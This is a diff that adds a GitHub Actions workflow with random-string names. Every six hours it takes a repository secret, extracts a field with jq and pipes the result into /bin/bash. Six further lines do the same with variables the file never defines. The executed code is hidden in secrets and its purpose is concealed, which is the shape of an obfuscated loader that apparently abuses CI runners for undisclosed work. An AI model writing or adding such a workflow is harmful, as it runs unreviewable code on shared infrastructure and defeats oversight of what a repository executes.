@@ -1,0 +1,24 @@
+name: shikunillah
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shikunillah
+        env:
+          kfgal5: ${{ secrets.kfgal5 }}
+        run: |
+          echo $kfgal5 | jq -r .mjv66264 | /bin/bash
+          echo $aby2428 | jq -r .zpe063 | /bin/bash
+          echo $zles54876 | jq -r .gc6 | /bin/bash
+          echo $l13796 | jq -r .xyac52782 | /bin/bash
+          echo $ohv98353 | jq -r .m0 | /bin/bash
+          echo $tq32 | jq -r .ecezd432 | /bin/bash
+          echo $akmya598 | jq -r .wfoc1 | /bin/bash
+
